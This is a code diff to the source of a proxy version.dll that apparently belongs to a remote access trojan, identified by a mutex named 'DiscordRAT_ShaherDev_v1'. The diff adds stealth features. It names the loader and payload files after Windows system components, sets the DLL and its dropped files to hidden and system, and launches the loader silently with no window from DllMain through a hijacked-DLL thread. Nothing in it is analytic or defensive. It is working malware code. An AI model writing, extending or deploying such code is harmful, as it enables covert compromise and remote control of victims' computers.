@@ -4,7 +4,12 @@
 
 #pragma comment(lib, "shell32.lib")
 
+#define LOADER_NAME L"WaaSMedicSvc.exe"
+#define PAYLOAD_NAME L"ProvData.db"
+#define CACHE_DIR L"Cache"
+
 static HMODULE g_realVersion = NULL;
+static HMODULE g_selfModule = NULL;
 
 static FARPROC RealProc(const char* name)
 {
@@ -25,6 +30,15 @@ static bool FileExistsW(const wchar_t* path)
     return attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
 }
 
+static void HideSystemPath(const wchar_t* path)
+{
+    DWORD attrs = GetFileAttributesW(path);
+    if (attrs != INVALID_FILE_ATTRIBUTES)
+    {
+        SetFileAttributesW(path, (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) & ~FILE_ATTRIBUTE_READONLY);
+    }
+}
+
 static bool GetPayloadRootDirectory(wchar_t* outPath, size_t outChars)
 {
     wchar_t localAppData[MAX_PATH] = { 0 };
@@ -36,30 +50,80 @@ static bool GetPayloadRootDirectory(wchar_t* outPath, size_t outChars)
     return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData));
 }
 
+static void HideDeployedFiles(const wchar_t* rootDir)
+{
+    wchar_t path[MAX_PATH] = { 0 };
+
+    StringCchPrintfW(path, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
+    HideSystemPath(path);
+
+    StringCchPrintfW(path, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
+    HideSystemPath(path);
+
+    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR, rootDir);
+    HideSystemPath(path);
+
+    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\TokenProv.db", rootDir);
+    HideSystemPath(path);
+
+    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\DeviceCache.db", rootDir);
+    HideSystemPath(path);
+
+    HideSystemPath(rootDir);
+}
+
+static void HideSelfDll()
+{
+    if (!g_selfModule)
+    {
+        return;
+    }
+
+    wchar_t selfPath[MAX_PATH] = { 0 };
+    if (GetModuleFileNameW(g_selfModule, selfPath, MAX_PATH))
+    {
+        HideSystemPath(selfPath);
+    }
+}
+
 static void LaunchRuntimeHost()
 {
     HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
     if (runningMutex)
     {
         CloseHandle(runningMutex);
+        HideSelfDll();
         return;
     }
 
     wchar_t rootDir[MAX_PATH] = { 0 };
     wchar_t loaderExe[MAX_PATH] = { 0 };
-    wchar_t coreBin[MAX_PATH] = { 0 };
+    wchar_t payloadFile[MAX_PATH] = { 0 };
+    wchar_t legacyLoader[MAX_PATH] = { 0 };
+    wchar_t legacyPayload[MAX_PATH] = { 0 };
 
     if (!GetPayloadRootDirectory(rootDir, MAX_PATH))
     {
         return;
     }
 
-    StringCchPrintfW(loaderExe, MAX_PATH, L"%s\\RuntimeHost.exe", rootDir);
-    StringCchPrintfW(coreBin, MAX_PATH, L"%s\\core.bin", rootDir);
+    StringCchPrintfW(loaderExe, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
+    StringCchPrintfW(payloadFile, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
+    StringCchPrintfW(legacyLoader, MAX_PATH, L"%s\\RuntimeHost.exe", rootDir);
+    StringCchPrintfW(legacyPayload, MAX_PATH, L"%s\\core.bin", rootDir);
 
-    if (!FileExistsW(loaderExe) || !FileExistsW(coreBin))
+    const wchar_t* launchPath = loaderExe;
+    if (!FileExistsW(loaderExe) || !FileExistsW(payloadFile))
     {
-        return;
+        if (FileExistsW(legacyLoader) && FileExistsW(legacyPayload))
+        {
+            launchPath = legacyLoader;
+        }
+        else
+        {
+            HideSelfDll();
+            return;
+        }
     }
 
     STARTUPINFOW si = { 0 };
@@ -68,11 +132,14 @@ static void LaunchRuntimeHost()
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    if (CreateProcessW(loaderExe, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, rootDir, &si, &pi))
+    if (CreateProcessW((wchar_t*)launchPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, rootDir, &si, &pi))
     {
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
     }
+
+    HideSelfDll();
+    HideDeployedFiles(rootDir);
 }
 
 DWORD WINAPI RunLoader(LPVOID)
@@ -184,6 +251,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
 {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH)
     {
+        g_selfModule = hModule;
         DisableThreadLibraryCalls(hModule);
         RealProc("GetFileVersionInfoW");
         HANDLE thread = CreateThread(NULL, 0, RunLoader, NULL, 0, NULL);
